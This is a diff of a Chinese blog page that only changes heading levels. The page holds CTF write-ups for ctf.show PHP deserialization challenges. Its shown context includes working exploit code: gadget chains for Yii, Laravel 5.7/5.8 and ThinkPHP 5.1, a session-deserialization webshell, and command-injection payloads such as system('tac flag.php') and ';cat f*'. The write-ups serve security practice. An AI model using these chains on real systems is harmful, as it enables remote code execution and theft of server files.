@@ -420,8 +420,8 @@ web255&amp;lt;?php
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><h5 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h5><p>只需通过get传参将username和password赋值为xxxxxx即可</p>
-<h5 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h5><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+                <h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h4><p>只需通过get传参将username和password赋值为xxxxxx即可</p>
+<h4 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 
 &#x2F;*
 \# -*- coding: utf-8 -*-
@@ -486,7 +486,7 @@ url：
 http:&#x2F;&#x2F;3e8f11f0-0df8-4e12-8f12-9da9900504df.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>拿到flag</p>
-<h5 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h5><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h4 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 
 &#x2F;*
 # -*- coding: utf-8 -*-
@@ -555,7 +555,7 @@ url：
 http:&#x2F;&#x2F;9292eade-bbdb-49e1-a88b-03d2b9e8c687.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>拿到flag</p>
-<h5 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h5><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h4 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 
 &#x2F;*
 # -*- coding: utf-8 -*-
@@ -656,7 +656,7 @@ psot:
 1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>拿到flag</p>
-<h5 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h5><pre class="line-numbers language-none"><code class="language-none">if(isset($username) &amp;&amp; isset($password))&#123;
+<h4 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h4><pre class="line-numbers language-none"><code class="language-none">if(isset($username) &amp;&amp; isset($password))&#123;
   if(!preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $_COOKIE[&#39;user&#39;]))&#123;
     $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);
   &#125;
@@ -740,7 +740,7 @@ post
 1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>拿到flag</p>
-<h5 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h5><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h4 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 highlight_file(__FILE__);
 $vip &#x3D; unserialize($_GET[&#39;vip&#39;]);
 &#x2F;&#x2F;vip can get flag one key
@@ -768,7 +768,7 @@ echo urlencode(serialize($client));<span aria-hidden="true" class="line-numbers-
 
 
 
-<h5 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h5><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h4 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 error_reporting(0);
 highlight_file(__FILE__);
 include(&#39;flag.php&#39;);
@@ -778,8 +778,8 @@ if(preg_match(&#39;&#x2F;ctfshow_i_love_36D&#x2F;&#39;,serialize($_GET[&#39;ctfs
 
 <p>直接将ctfhsow赋值为ctfshow_i_love_36D</p>
 <p>拿到flag</p>
-<h5 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h5><p>不是很明白，先跳过</p>
-<h5 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h5><p>在注释中发现message.php，访问：</p>
+<h4 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h4><p>不是很明白，先跳过</p>
+<h4 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h4><p>在注释中发现message.php，访问：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 
 &#x2F;*
@@ -825,7 +825,7 @@ echo base64_encode(serialize($a));<span aria-hidden="true" class="line-numbers-r
 
 
 
-<h5 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h5><p>弄了半天也不知道咋弄，就又只能先去看群主给的视频，说是有源码提示，<a target="_blank" rel="noopener" href="http://www.zip,下载下来后,应该是session反序列化/">www.zip，下载下来后，应该是session反序列化</a></p>
+<h4 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h4><p>弄了半天也不知道咋弄，就又只能先去看群主给的视频，说是有源码提示，<a target="_blank" rel="noopener" href="http://www.zip,下载下来后,应该是session反序列化/">www.zip，下载下来后，应该是session反序列化</a></p>
 <pre class="line-numbers language-none"><code class="language-none">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>发现在登录框中用到了file_put_content()函数，而username和password我们可控，那么就可以写入自己的🐎，exp：</p>
@@ -854,7 +854,7 @@ echo base64_encode(&quot;|&quot;.serialize($a));<span aria-hidden="true" class="
 <p>然后再访问log-1.php</p>
 <p><img src="/images/web_263c.png"></p>
 <p>然后再直接通过post的方式进行执行命令即可拿到flag</p>
-<h5 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h5><p>又是字符逃逸，直接上payload：</p>
+<h4 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h4><p>又是字符逃逸，直接上payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 class message&#123;
     public $from;
@@ -876,7 +876,7 @@ $b &#x3D; filter($a);
 echo $b;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后再访问messag.php并在cookie中添加msg的值，即可拿到flag</p>
-<h5 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h5><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h4 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 error_reporting(0);
 include(&#39;flag.php&#39;);
 highlight_file(__FILE__);
@@ -911,7 +911,7 @@ echo urlencode(serialize($a));<span aria-hidden="true" class="line-numbers-rows"
 
 
 
-<h5 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h5><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h4 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 
 highlight_file(__FILE__);
 include(&#39;flag.php&#39;);
@@ -944,7 +944,7 @@ if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $cs))&#123;
 O:7:&quot;ctfshow&quot;:2:&#123;jian&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>用bp提交，拿到flag</p>
-<h5 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h5><p>再次尬住了，翻了半天也找不到突破口，继续看了群主给的wp视频，，先用弱口令登录进去，然后查看源码，发现?view-source和是yii框架，在url后加上&amp;view-source，出现</p>
+<h4 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h4><p>再次尬住了，翻了半天也找不到突破口，继续看了群主给的wp视频，，先用弱口令登录进去，然后查看源码，发现?view-source和是yii框架，在url后加上&amp;view-source，出现</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;&#x2F;backdoor&#x2F;shell
 unserialize(base64_decode($_GET[&#39;code&#39;]))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
@@ -988,7 +988,7 @@ namespace&#123;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>再访问1.txt,拿到flag</p>
-<h5 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h5><p>这题在上一题的基础上过滤了flag，换个链子：</p>
+<h4 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h4><p>这题在上一题的基础上过滤了flag，换个链子：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 namespace yii\rest &#123;
     class Action
@@ -1035,8 +1035,8 @@ namespace &#123;
 
 
 
-<h5 id="web269-270"><a href="#web269-270" class="headerlink" title="web269-270"></a>web269-270</h5><p>与268相同</p>
-<h5 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h5><p>laravel 5.7的反序列化，先复现吧，等做到后面的关再理解：</p>
+<h4 id="web269-270"><a href="#web269-270" class="headerlink" title="web269-270"></a>web269-270</h4><p>与268相同</p>
+<h4 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h4><p>laravel 5.7的反序列化，先复现吧，等做到后面的关再理解：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 namespace Illuminate\Foundation\Testing&#123;
 	class PendingCommand&#123;
@@ -1083,7 +1083,7 @@ namespace&#123;
 
 
 
-<h5 id="web272-273"><a href="#web272-273" class="headerlink" title="web272-273"></a>web272-273</h5><p>Laravel5.8反序列化漏洞,继续用师傅们给的链子：</p>
+<h4 id="web272-273"><a href="#web272-273" class="headerlink" title="web272-273"></a>web272-273</h4><p>Laravel5.8反序列化漏洞,继续用师傅们给的链子：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 namespace Illuminate\Broadcasting&#123;
  
@@ -1155,7 +1155,7 @@ namespace&#123;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>在phpinfo页面找到flag</p>
-<h5 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h5><p>进去就是Thinkphp v5.1，看样子就是thinkphp反序列化了，右键查看源码，找到入口，get传参code，但还是偷懒，找了下yu师傅发的链子（?lin=cat /f*&amp;data=）</p>
+<h4 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h4><p>进去就是Thinkphp v5.1，看样子就是thinkphp反序列化了，右键查看源码，找到入口，get传参code，但还是偷懒，找了下yu师傅发的链子（?lin=cat /f*&amp;data=）</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 namespace think;
 abstract class Model&#123;
@@ -1208,14 +1208,14 @@ echo base64_encode(serialize(new Windows()));
 
 
 
-<h5 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h5><p>发现魔法函数__destruct用system函数，那么只需让$this-&gt;evilfile为tru,$content又可以用post传参进行控制，payload：</p>
+<h4 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h4><p>发现魔法函数__destruct用system函数，那么只需让$this-&gt;evilfile为tru,$content又可以用post传参进行控制，payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">?fn&#x3D;;cat f*
 post:
 jian&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h5 id="web276-278"><a href="#web276-278" class="headerlink" title="web276-278"></a>web276-278</h5><p>先跳过了，等以后再找时间做吧</p>
+<h4 id="web276-278"><a href="#web276-278" class="headerlink" title="web276-278"></a>web276-278</h4><p>先跳过了，等以后再找时间做吧</p>
 
                 
             </div>
@@ -1695,7 +1695,7 @@ jian&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><s
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
-                        class="white-color">21.9k</span>
+                        class="white-color">22.6k</span>
             
             
             
